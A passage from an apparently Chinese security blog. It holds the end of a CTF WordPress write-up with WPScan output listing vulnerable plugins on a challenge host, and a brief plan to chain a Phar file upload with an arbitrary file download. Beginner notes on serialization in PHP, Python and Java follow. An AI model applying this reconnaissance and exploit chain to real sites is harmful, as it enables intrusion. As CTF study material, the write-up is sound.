</span>|<span class="hljs-string"> Location: http://124.71.184.68:8012/wp-content/themes/twentytwentyfour/</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Readme: http://124.71.184.68:8012/wp-content/themes/twentytwentyfour/readme.txt</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Style URL: http://124.71.184.68:8012/wp-content/themes/twentytwentyfour/style.css</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> Found By: Urls In Homepage (Passive Detection)</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> The version could not be determined.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="hljs-string">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] Plugin(s) Identified:</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] all-in-one-video-gallery</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Location: http://124.71.184.68:8012/wp-content/plugins/all-in-one-video-gallery/</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Last Updated: 2023-09-01T08:47:00.000Z</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> [!] The version is out of date, the latest version is 3.5.2</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> Found By: Urls In Homepage (Passive Detection)</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> [!] 2 vulnerabilities identified:</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> [!] Title: All-in-One Video Gallery 2.5.8 - 2.6.0 - Unauthenticated Arbitrary File Download &amp; SSRF</span><br><span class="hljs-string"> </span>|<span class="hljs-string">     Fixed in: 2.6.1</span><br><span class="hljs-string"> </span>|<span class="hljs-string">     References:</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://wpscan.com/vulnerability/852c257c-929a-4e4e-b85e-064f8dadd994</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-2633</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> [!] Title: Freemius SDK &lt; 2.5.10 - Reflected Cross-Site Scripting</span><br><span class="hljs-string"> </span>|<span class="hljs-string">     Fixed in: 3.4.3</span><br><span class="hljs-string"> </span>|<span class="hljs-string">     References:</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://wpscan.com/vulnerability/7fd1ad0e-9db9-47b7-9966-d3f5a8771571</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33999</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> Version: 2.6.0 (80% confidence)</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - http://124.71.184.68:8012/wp-content/plugins/all-in-one-video-gallery/README.txt</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] contact-form-7</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Location: http://124.71.184.68:8012/wp-content/plugins/contact-form-7/</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Last Updated: 2023-12-19T04:49:00.000Z</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> [!] The version is out of date, the latest version is 5.8.5</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> Found By: Urls In Homepage (Passive Detection)</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> Version: 5.8.4 (90% confidence)</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Query Parameter (Passive Detection)</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - http://124.71.184.68:8012/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.8.4</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Confirmed By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - http://124.71.184.68:8012/wp-content/plugins/contact-form-7/readme.txt</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] drag-and-drop-multiple-file-upload-contact-form-7</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Location: http://124.71.184.68:8012/wp-content/plugins/drag-and-drop-multiple-file-upload-contact-form-7/</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Last Updated: 2023-12-05T07:37:00.000Z</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> [!] The version is out of date, the latest version is 1.3.7.4</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> Found By: Urls In Homepage (Passive Detection)</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> [!] 4 vulnerabilities identified:</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> [!] Title: Drag and Drop Multiple File Upload - Contact Form 7 &lt; 1.3.6.3 - Unauthenticated Stored XSS</span><br><span class="hljs-string"> </span>|<span class="hljs-string">     Fixed in: 1.3.6.3</span><br><span class="hljs-string"> </span>|<span class="hljs-string">     References:</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://wpscan.com/vulnerability/1b849957-eaca-47ea-8f84-23a3a98cc8de</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0595</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://plugins.trac.wordpress.org/changeset/2686614</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> [!] Title: Drag and Drop Multiple File Upload &lt; 1.3.6.5 - File Upload Size Limit Bypass</span><br><span class="hljs-string"> </span>|<span class="hljs-string">     Fixed in: 1.3.6.5</span><br><span class="hljs-string"> </span>|<span class="hljs-string">     References:</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://wpscan.com/vulnerability/035dffef-4b4b-4afb-9776-7f6c5e56452c</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3282</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> [!] Title: Drag and Drop Multiple File Upload – Contact Form 7 &lt; 1.3.6.6 - File Upload and File deletion via CSRF</span><br><span class="hljs-string"> </span>|<span class="hljs-string">     Fixed in: 1.3.6.6</span><br><span class="hljs-string"> </span>|<span class="hljs-string">     References:</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://wpscan.com/vulnerability/e6a76476-e086-473d-bc1e-3264c85b2441</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-45364</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> [!] Title: Drag and Drop Multiple File Upload - Contact Form 7 &lt; 1.3.7.4 - Unauthenticated Arbitrary File Upload</span><br><span class="hljs-string"> </span>|<span class="hljs-string">     Fixed in: 1.3.7.4</span><br><span class="hljs-string"> </span>|<span class="hljs-string">     References:</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://wpscan.com/vulnerability/d758ce63-73fb-46a6-9cc7-c114db2e2512</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-5822</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://www.wordfence.com/threat-intel/vulnerabilities/id/1b3be300-5b7f-4844-8637-1bb8c939ed4c</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> Version: 1.3.6.2 (80% confidence)</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - http://124.71.184.68:8012/wp-content/plugins/drag-and-drop-multiple-file-upload-contact-form-7/readme.txt</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>注意：</p><p><img src="/img/ezwordpress1.png" alt="ezwordpress1"></p><p><img src="/img/ezwordpress2.png" alt="ezwordpress2"></p><p><img src="/img/ezwordpress3.png" alt="ezwordpress3"></p><p><a href="https://wpscan.com/vulnerability/1b849957-eaca-47ea-8f84-23a3a98cc8de/">文件上传</a>: 上传<code>Phar</code>类型文件</p><p><a href="https://wpscan.com/vulnerability/852c257c-929a-4e4e-b85e-064f8dadd994/">文件下载</a>：触发<code>Phar</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全初探_反序列化基础</title>
    <link href="/2023/12/30/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/12/30/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p>学习笔记</p><span id="more"></span><hr><blockquote><p>最近开了个新坑：java安全，随便写点笔记</p></blockquote><h3 id="0x01-什么是序列化和反序列化？"><a href="#0x01-什么是序列化和反序列化？" class="headerlink" title="0x01 什么是序列化和反序列化？"></a>0x01 什么是序列化和反序列化？</h3><p>​简单说就是让数据以流的形式在网络上传输(比如两个对象之间)或者被存储介质存储。序列化将对象转换为字节流，反序列化将字节流转换为数据。比如：A给B打电话，我们需要把声音信号转换成电&#x2F;光等信号传输，然后收方再把电&#x2F;光信号等还原成声音信号。</p><p>​当对象被序列化时，它的状态被转换为字节流并保存起来。这意味着即使程序结束或关闭，对象的状态仍然可以被保留。当需要重新使用对象时，可以通过反序列化将字节流转换回对象，并恢复对象的状态。</p><p>​<code>Java</code> 中被创建的对象的声明周期一般不会比<code> JVM</code> 的运行周期更长，<code>JVM </code> 运行结束以后，其创建的对象也就消失了。但在某些情况下，我们想要达到一种效果，即即使<code>JVM</code> 结束运行了，我们还可以用到之前所创建的对象，或者说，我们想要将之前创建的对象保存下来，以便进行传输，更或者说，让之前<code>JVM </code>所创建的对象能够在另一个<code> JVM</code> 中运行。要达到这样的功能，就可以采用<code> Java</code> 中的序列化和反序列化机制。</p><p>​不光在<code>java</code>中，<code>php、python</code>均存在序列化和反序列化，下面举几个简单栗子。</p><h3 id="0x02-php-python-java中的序列化和反序列化"><a href="#0x02-php-python-java中的序列化和反序列化" class="headerlink" title="0x02 php, python, java中的序列化和反序列化"></a>0x02 php, python, java中的序列化和反序列化</h3><ul><li>PHP</li></ul><p><strong>写这段<code>PHP</code>的时候才意识到自己已经24岁了:)还不太习惯($this-&gt;age &#x3D; ‘24’)</strong></p><p><strong>希望时间过的慢点捏:)</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Notbad</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$gender</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-string">&#x27;viper3&#x27;</span>;<br><span class="hljs-variable language_">$this</span>-&gt;gender = <span class="hljs-string">&#x27;male&#x27;</span>;<br><span class="hljs-variable language_">$this</span>-&gt;age = <span class="hljs-string">&#x27;24&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Notbad</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br\&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span> (<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>));<br><span class="hljs-meta">?&gt;</span><br>    <br><span class="hljs-comment">//O:6:&quot;Notbad&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;viper3&quot;;s:6:&quot;gender&quot;;s:4:&quot;male&quot;;s:3:&quot;age&quot;;s:2:&quot;23&quot;;&#125;</span><br>    <br><span class="hljs-comment">//object(Notbad)#2 (3) &#123;</span><br>  [<span class="hljs-string">&quot;name&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">6</span>) <span class="hljs-string">&quot;viper3&quot;</span><br>  [<span class="hljs-string">&quot;gender&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;male&quot;</span><br>  [<span class="hljs-string">&quot;age&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;23&quot;</span><br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li>python</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-comment"># 定义一个类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        self.name = name<br>        self.age = age<br><br><span class="hljs-comment"># 创建一个Person对象</span><br>person = Person(<span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-number">25</span>)<br><br><span class="hljs-comment"># 序列化对象</span><br>serialized_data = pickle.dumps(person)<br><br><span class="hljs-comment"># 打印序列化后的字节流</span><br><span class="hljs-built_in">print</span>(serialized_data)<br><br><span class="hljs-comment"># 反序列化对象</span><br>deserialized_person = pickle.loads(serialized_data)<br><br><span class="hljs-comment"># 打印反序列化后的对象属性</span><br><br><span class="hljs-built_in">print</span>(deserialized_person.name)<br><span class="hljs-built_in">print</span>(deserialized_person.age)<br><br>/*<span class="hljs-string">b&#x27;\x80\x04\x95\x1b\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06Person\x94\x93\x94)\x81\x94&#125;\x94(\x8c\x04name\x94\x8c\x05Alice\x94\x8c\x03age\x94K\x19ub.&#x27;</span><br>Alice<br><span class="hljs-number">25</span><br><br><span class="hljs-comment">#当然也可以使用Json.dumps()函数将对象序列化成Json格式：</span><br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-comment"># 定义一个字典</span><br>data = &#123;<br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Alice&quot;</span>,<br>    <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">25</span>,<br>    <span class="hljs-string">&quot;city&quot;</span>: <span class="hljs-string">&quot;New York&quot;</span><br>&#125;<br><br><span class="hljs-comment"># 序列化数据为字符串</span><br>serialized_data = json.dumps(data)<br><br><span class="hljs-comment"># 打印序列化后的字符串</span><br><span class="hljs-built_in">print</span>(serialized_data)<br><br><span class="hljs-comment">#</span><br>&#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">25</span>, <span class="hljs-string">&quot;city&quot;</span>: <span class="hljs-string">&quot;New York&quot;</span>&#125;<br></code></pre></td></tr></table></figure><ul><li>java</li></ul><p>​<code>Java</code>反序列化的操作，很多是需要开发者深入参与的，大量的库都会实现<code>readObject、writeObject</code>方法，这和PHP中的<code>__wakeup、__sleep</code>很少使用是存在鲜明对比的。</p><p>​<code>Java</code>在序列化一个对象时，将会调用这个对象中的<code>writeObject</code>方法，参数类型是<code>ObjectOutputStream</code>，开发者可以将任何内容写入这个流当中，反序列化时会调用<code>readObject</code>，开发者也可以从中读取前面写入的内容，并进行处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//参考了mochu7师傅的文章</span><br><span class="hljs-keyword">package</span> StudyUnserialiation;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<span class="hljs-comment">//Serializable是一个标记接口，用于标识一个类可以被序列化</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">java</span>.io.Serializable &#123;<span class="hljs-comment">//implements是一个关键字，用于表示一个类实现了一个接口。</span><br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(ObjectOutputStream s)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        s.defaultWriteObject();<br>        s.writeObject(<span class="hljs-string">&quot;This is Object&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream s)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        s.defaultReadObject(); <br>        s.readObject();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> (String) s.readObject();<br>        System.out.println(message);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><span class="hljs-comment">//重写</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//writeObject和readObject方法可以完全自定义。当一个类实现了Serializable接口时，它可以选择重写这两个方法来自定义对象的序列化和反序列化过程。</span><br><span class="hljs-comment">//writeObject方法用于将对象序列化为字节流。当对象被序列化时，writeObject方法会被自动调用。在这个方法中，可以自定义需要序列化的字段和逻辑。例如，可以在序列化过程中对某些字段进行加密或压缩操作。</span><br><span class="hljs-comment">//readObject方法用于将字节流反序列化为对象。当对象被反序列化时，readObject方法会被自动调用。在这个方法中，可以自定义需要反序列化的字段和逻辑。例如，可以在反序列化过程中对某些字段进行解密或解压操作。</span><br></code></pre></td></tr></table></figure><h3 id="0x03-java反序列化基础"><a href="#0x03-java反序列化基础" class="headerlink" title="0x03 java反序列化基础"></a>0x03 java反序列化基础</h3><p>在Java中，如果一个类需要被序列化和反序列化，需要实现<code>java.io.Serializable</code>接口，比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> String name;<br>&#125;<br></code></pre></td></tr></table></figure><p>Java原生实现了一套序列化的机制，我们不需要额外编写代码，只需要实现<code>java.io.Serializable</code>接口，并调用<code>ObjectOutputStream</code>类的的<code>writeObject</code>方法即可，比如要对下面这个<code>Person</code>类进行序列化操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Persona</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123; <span class="hljs-comment">//注意这个接口</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Persona</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;无参构造.&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Persona</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        System.out.println(<span class="hljs-string">&quot;有参构造.&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//参考https://dyfloveslife.github.io/2020/03/21/Serialization-and-Deserialization-in-Java/</span><br></code></pre></td></tr></table></figure><p>将其序列化，将对象的信息写入到<code>abc.txt</code>文件中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializableTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">Persona</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Persona</span>(<span class="hljs-string">&quot;zhangsan&quot;</span>, <span class="hljs-number">24</span>);<br>        <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;abc.txt&quot;</span>));<br>        oos.writeObject(person);<br>        oos.close();<br>    &#125;<br>&#125;<br><span class="hljs-comment">//ObjectOutputStream 是一个用于将对象序列化为字节流的类。</span><br><span class="hljs-comment">//writeObject 方法将 person 对象写入到 ObjectOutputStream中</span><br></code></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang">有参构造.<br></code></pre></td></tr></table></figure><p>可以打开<code>abc.txt</code>看看怎么个事：</p><p><img src="/img/javafan1.png" alt="javafan1"></p><p>反序列化对象时，需要创建一个 <code>ObjectInputStream</code> 输入流，然后调用<code>ObjectInputStream</code>对象的 <code>readObject() </code>方法得到序列化的对象即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnSerializableTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;abc.txt&quot;</span>));<br>        <span class="hljs-type">Persona</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> (Persona) ois.readObject();<span class="hljs-comment">//注意这里的强制类型转换</span><br>        System.out.println(p);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Person&#123;<span class="hljs-attribute">name</span>=<span class="hljs-string">&#x27;zhangsan&#x27;</span>, <span 